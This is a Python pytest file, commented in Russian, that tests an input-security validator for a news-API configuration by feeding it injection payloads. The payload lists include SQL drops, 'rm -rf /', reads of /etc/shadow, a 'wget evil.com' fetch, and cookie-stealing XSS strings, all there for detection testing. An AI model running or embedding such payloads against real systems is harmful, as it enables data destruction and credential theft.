# /tests/utils/test_input_validator.py

import pytest
import logging
from unittest.mock import patch, MagicMock

from src.utils.input_validator import (
    InputSecurityValidator,
    ThreatType,
    validate_api_input,
    security_validator
)


class TestInputSecurityValidator:
    """Тесты для валидатора безопасности входящих данных"""
    
    @pytest.fixture
    def validator(self):
        """Создает экземпляр валидатора для тестов"""
        return InputSecurityValidator()
    
    @pytest.fixture
    def mock_logger(self):
        """Создает mock логгера для проверки вызовов"""
        with patch('src.utils.input_validator.setup_logger') as mock_setup:
            mock_logger_instance = MagicMock()
            mock_setup.return_value = mock_logger_instance
            yield mock_logger_instance
    
    # Тесты для _detect_threat_type
    
    def test_detect_sql_injection_threats(self, validator):
        """Тестирует детекцию SQL инъекций"""
        sql_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "admin'/*",
            "' UNION SELECT * FROM passwords",
            "user'; DELETE FROM accounts; --",
            "'; INSERT INTO evil VALUES ('hack'); --",
            "'; UPDATE users SET admin=1; --",
        ]
        
        for payload in sql_payloads:
            threat_type = validator._detect_threat_type(payload)
            assert threat_type == ThreatType.SQL_INJECTION, f"Failed to detect SQL injection in: {payload}"
    
    def test_detect_xss_threats(self, validator):
        """Тестирует детекцию XSS атак"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('hack')",
            "<img onerror='alert(1)' src='x'>",
            "<iframe src='evil.com'></iframe>",
            "<object data='malware.swf'></object>",
            "<embed src='virus.exe'>",
            "<form action='evil.com'>",
            "document.cookie",
            "window.location='hack.com'",
        ]
        
        for payload in xss_payloads:
            threat_type = validator._detect_threat_type(payload)
            assert threat_type == ThreatType.XSS, f"Failed to detect XSS in: {payload}"
    
    def test_detect_command_injection_threats(self, validator):
        """Тестирует детекцию command injection"""
        cmd_payloads = [
            "test | cat /etc/passwd",
            "user && rm -rf /",
            "file; ls -la",
            "$(cat /etc/shadow)",
            "`whoami`",
            "cmd.exe /c dir",
            "bash -c 'rm *'",
            "sh -c 'wget evil.com'",
            "powershell -Command 'Get-Process'",
            "exec('rm -rf /')",
            "test > /dev/null",
            "error 2>&1",
        ]
        
        for payload in cmd_payloads:
            threat_type = validator._detect_threat_type(payload)
            assert threat_type == ThreatType.COMMAND_INJECTION, f"Failed to detect command injection in: {payload}"
    
    def test_detect_path_traversal_threats(self, validator):
        """Тестирует детекцию path traversal"""
        path_payloads = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32",
            "/etc/passwd",
            "/etc/shadow",
            "c:\\windows\\system32",
            "c:\\system32\\drivers",
            "/proc/self/environ",
            "/var/log/apache",
        ]
        
        for payload in path_payloads:
            threat_type = validator._detect_threat_type(payload)
            assert threat_type == ThreatType.PATH_TRAVERSAL, f"Failed to detect path traversal in: {payload}"
    
    def test_safe_strings_no_threats(self, validator):
        """Тестирует что безопасные строки не определяются как угрозы"""
        safe_strings = [
            "normal_field_name",
            "user123",
            "en,ru",
            "category=business",
            "https://api.example.com",
            "test@example.com",
            "Simple text value",
            "123456",
            "true",
            "2024-01-01",
        ]
        
        for safe_string in safe_strings:
            threat_type = validator._detect_threat_type(safe_string)
            assert threat_type is None, f"False positive threat detection in: {safe_string}"
    
    # Тесты для _clean_dangerous_chars
    
    def test_clean_field_name_chars(self, validator):
        """Тестирует очистку символов в названиях полей"""
        test_cases = [
            ("field@name", "fieldname"),
            ("field-name", "fieldname"),
            ("field name", "fieldname"),
            ("field123", "field123"),
            ("field_name", "field_name"),
            ("FIELD_NAME", "FIELD_NAME"),
            ("field$%^&", "field"),
        ]
        
        for original, expected in test_cases:
            result = validator._clean_dangerous_chars(original, is_field_name=True)
            assert result == expected, f"Field name cleaning failed: '{original}' -> '{result}', expected: '{expected}'"
    
    def test_clean_field_value_chars(self, validator):
        """Тестирует очистку символов в значениях полей"""
        test_cases = [
            ("user@example.com", "user@example.com"),
            ("en,ru", "en,ru"),
            ("https://api.test.com", "https://api.test.com"),
            ("value with spaces", "value with spaces"),
            ("value-123", "value-123"),
            ("field=value&other=123", "field=value&other=123"),
            ("value<script>", "valuescript"),
            ("test$%^()[]", "test"),
        ]
        
        for original, expected in test_cases:
            result = validator._clean_dangerous_chars(original, is_field_name=False)
            assert result == expected, f"Field value cleaning failed: '{original}' -> '{result}', expected: '{expected}'"
    
    # Тесты для sanitize_field_name
    
    def test_sanitize_field_name_length_limit(self, validator, mock_logger):
        """Тестирует ограничение длины названий полей"""
        validator.logger = mock_logger
        
        long_field_name = "a" * 50  # Больше лимита в 20 символов
        result = validator.sanitize_field_name(long_field_name)
        
        assert len(result) == validator.MAX_FIELD_NAME_LENGTH
        assert result == "a" * 20
        mock_logger.warning.assert_called()
        assert "FIELD_LENGTH_EXCEEDED" in str(mock_logger.warning.call_args)
    
    def test_sanitize_field_name_threat_detection(self, validator, mock_logger):
        """Тестирует детекцию угроз в названиях полей"""
        validator.logger = mock_logger
        
        malicious_field = "field'; DROP TABLE"
        result = validator.sanitize_field_name(malicious_field)
        
        assert result == "fieldDROPTABLE"  # Очищенное значение
        mock_logger.warning.assert_called()
        assert "SQL_INJECTION" in str(mock_logger.warning.call_args)
    
    def test_sanitize_field_name_type_conversion(self, validator):
        """Тестирует преобразование типов для названий полей"""
        test_cases = [
            (123, "123"),
            (12.34, "1234"),
            (True, "True"),
            (None, "None"),
        ]
        
        for original, expected in test_cases:
            result = validator.sanitize_field_name(original)
            assert result == expected, f"Type conversion failed: {original} -> {result}, expected: {expected}"
    
    # Тесты для sanitize_field_value
    
    def test_sanitize_field_value_length_limit(self, validator, mock_logger):
        """Тестирует ограничение длины значений полей"""
        validator.logger = mock_logger
        
        long_value = "a" * 300  # Больше лимита в 200 символов
        result = validator.sanitize_field_value(long_value)
        
        assert len(result) == validator.MAX_FIELD_VALUE_LENGTH
        assert result == "a" * 200
        mock_logger.warning.assert_called()
        assert "VALUE_LENGTH_EXCEEDED" in str(mock_logger.warning.call_args)
    
    def test_sanitize_field_value_threat_detection(self, validator, mock_logger):
        """Тестирует детекцию угроз в значениях полей"""
        validator.logger = mock_logger
        
        malicious_value = "<script>alert('hack')</script>"
        result = validator.sanitize_field_value(malicious_value)
        
        assert "<script>" not in result
        assert "alert" in result  # Текст остается, но теги удаляются
        mock_logger.warning.assert_called()
        assert "XSS" in str(mock_logger.warning.call_args)
    
    def test_sanitize_field_value_none_handling(self, validator):
        """Тестирует обработку None значений"""
        result = validator.sanitize_field_value(None)
        assert result == ""
    
    def test_sanitize_field_value_type_conversion(self, validator):
        """Тестирует преобразование типов для значений полей"""
        test_cases = [
            (123, "123"),
            (12.34, "12.34"),
            (True, "True"),
            (False, "False"),
        ]
        
        for original, expected in test_cases:
            result = validator.sanitize_field_value(original)
            assert result == expected, f"Type conversion failed: {original} -> {result}, expected: {expected}"
    
    # Тесты для validate_config_dict
    
    def test_validate_config_dict_basic(self, validator):
        """Тестирует базовую валидацию конфигурационного словаря"""
        test_config = {
            "language": "en,ru",
            "category": "business",
            "limit": "50",
            "query": "test query"
        }
        
        result = validator.validate_config_dict(test_config)
        
        assert len(result) == 4
        assert result["language"] == "en,ru"
        assert result["category"] == "business"
        assert result["limit"] == "50"
        assert result["query"] == "test query"
    
    def test_validate_config_dict_empty_values_excluded(self, validator):
        """Тестирует исключение пустых значений"""
        test_config = {
            "language": "en,ru",
            "category": "",
            "limit": "50",
            "empty_field": None,
            "another_empty": "   ",  # Пробелы должны быть удалены strip()
        }
        
        result = validator.validate_config_dict(test_config)
        
        assert len(result) == 2  # Только language и limit
        assert "category" not in result
        assert "empty_field" not in result
        assert "another_empty" not in result
    
    def test_validate_config_dict_fields_limit(self, validator, mock_logger):
        """Тестирует ограничение количества полей"""
        validator.logger = mock_logger
        
        # Создаем словарь с количеством полей больше лимита
        test_config = {f"field_{i}": f"value_{i}" for i in range(150)}
        
        result = validator.validate_config_dict(test_config)
        
        assert len(result) <= validator.MAX_FIELDS_COUNT
        mock_logger.warning.assert_called()
        assert "Too many fields" in str(mock_logger.warning.call_args)
    
    def test_validate_config_dict_invalid_input_type(self, validator, mock_logger):
        """Тестирует обработку некорректного типа входных данных"""
        validator.logger = mock_logger
        
        result = validator.validate_config_dict("not a dict")
        
        assert result == {}
        mock_logger.error.assert_called()
        assert "Config must be a dictionary" in str(mock_logger.error.call_args)
    
    def test_validate_config_dict_malicious_fields(self, validator, mock_logger):
        """Тестирует валидацию конфига с вредоносными полями"""
        validator.logger = mock_logger
        
        test_config = {
            "valid_field": "normal_value",
            "field'; DROP TABLE": "malicious_field_name",
            "normal_field": "<script>alert('xss')</script>",
            "cmd_field": "test | cat /etc/passwd",
        }
        
        result = validator.validate_config_dict(test_config)
        
        # Проверяем что все поля были очищены
        assert "valid_field" in result
        assert result["valid_field"] == "normal_value"
        
        # Вредоносные символы должны быть удалены
        cleaned_keys = list(result.keys())
        assert any("DROP" in key for key in cleaned_keys)  # Поле было очищено, но не удалено
        
        # Проверяем что были зафиксированы предупреждения
        assert mock_logger.warning.call_count > 0
    
    def test_validate_config_dict_edge_cases(self, validator):
        """Тестирует граничные случаи"""
        # Пустой словарь
        result = validator.validate_config_dict({})
        assert result == {}
        
        # Словарь с пустыми ключами (после очистки)
        test_config = {"": "value", "   ": "another"}
        result = validator.validate_config_dict(test_config)
        assert len(result) == 0  # Пустые ключи должны быть исключены
    
    # Тесты для глобальных функций
    
    def test_validate_api_input_function(self):
        """Тестирует глобальную функцию validate_api_input"""
        test_data = [
            {
                "provider": "thenewsapi_com",
                "config": {
                    "language": "en,ru",
                    "category": "business",
                    "limit": "50"
                }
            },
            {
                "provider": "newsdata_io", 
                "config": {
                    "q": "test search",
                    "size": "100"
                }
            }
        ]
        
        result = validate_api_input(test_data)
        
        assert isinstance(result, list)
        assert len(result) == 2
        assert result[0]["provider"] == "thenewsapi_com"
        assert result[0]["config"]["language"] == "en,ru"
        assert result[1]["provider"] == "newsdata_io"
        assert result[1]["config"]["q"] == "test search"
    
    def test_security_validator_singleton(self):
        """Тестирует что глобальный валидатор является экземпляром правильного класса"""
        assert isinstance(security_validator, InputSecurityValidator)
    
    # Интеграционные тесты
    
    def test_integration_real_world_config(self, validator):
        """Интеграционный тест с реалистичной конфигурацией"""
        real_config = [
            {
                "provider": "thenewsapi_com",
                "config": {
                    "language": "en,ru",
                    "published_after": "2025-01-16T20:02",
                    "limit": "66",
                    "search": "test query",
                    "categories": "general,politics",
                    "domains": "example.com,news.com",
                }
            }
        ]
        
        # Используем новую функцию validate_api_input
        validated_config = validate_api_input(real_config)
        
        assert len(validated_config) == 1
        assert validated_config[0]["provider"] == "thenewsapi_com"
        provider_config = validated_config[0]["config"]
        assert provider_config["language"] == "en,ru"
        assert provider_config["limit"] == "66"
    
    def test_integration_malicious_config_cleanup(self, validator, mock_logger):
        """Интеграционный тест с вредоносной конфигурацией"""
        validator.logger = mock_logger
        
        malicious_config = {
            "'; DROP TABLE providers; --": {
                "search": "'; UNION SELECT * FROM users; --",
                "category": "<script>alert('xss')</script>",
                "command": "rm -rf / && echo 'hacked'",
                "path": "../../../etc/passwd",
                "normal_field": "safe_value"
            }
        }
        
        validated_config = {}
        for provider_name, provider_config in malicious_config.items():
            # Сначала очищаем имя провайдера
            clean_provider_name = validator.sanitize_field_name(provider_name)
            if clean_provider_name:
                validated_provider = validator.validate_config_dict(provider_config)
                if validated_provider:
                    validated_config[clean_provider_name] = validated_provider
        
        # Проверяем что конфиг был очищен но не потерян полностью
        assert len(validated_config) == 1
        provider_config = list(validated_config.values())[0]
        assert "normal_field" in provider_config
        assert provider_config["normal_field"] == "safe_value"
        
        # Проверяем что угрозы были зафиксированы
        assert mock_logger.warning.call_count > 0
    
    # Тесты производительности
    
    def test_performance_large_config(self, validator):
        """Тестирует производительность на большой конфигурации"""
        import time
        
        # Создаем большую конфигурацию (но в пределах лимитов)
        large_config = {}
        for i in range(90):  # Близко к лимиту в 100 полей
            large_config[f"field_{i}"] = f"value_{i}_" + "x" * 150  # Близко к лимиту в 200 символов
        
        start_time = time.time()
        result = validator.validate_config_dict(large_config)
        end_time = time.time()
        
        # Валидация должна завершиться быстро (менее 1 секунды)
        assert end_time - start_time < 1.0
        assert len(result) == 90
    
    # Тесты параметров класса
    
    def test_class_constants(self, validator):
        """Тестирует корректность констант класса"""
        assert validator.MAX_FIELD_NAME_LENGTH == 20
        assert validator.MAX_FIELD_VALUE_LENGTH == 200
        assert validator.MAX_FIELDS_COUNT == 100
        
        assert len(validator.SQL_INJECTION_PATTERNS) > 0
        assert len(validator.XSS_PATTERNS) > 0
        assert len(validator.COMMAND_INJECTION_PATTERNS) > 0
        assert len(validator.PATH_TRAVERSAL_PATTERNS) > 0
        
        # Проверяем что регексы компилируются
        assert validator.ALLOWED_FIELD_CHARS.pattern == r'^[a-zA-Z0-9_]+$'
        assert validator.ALLOWED_VALUE_CHARS.pattern == r'^[a-zA-Z0-9_\-.,@/:?&=\s]*$' 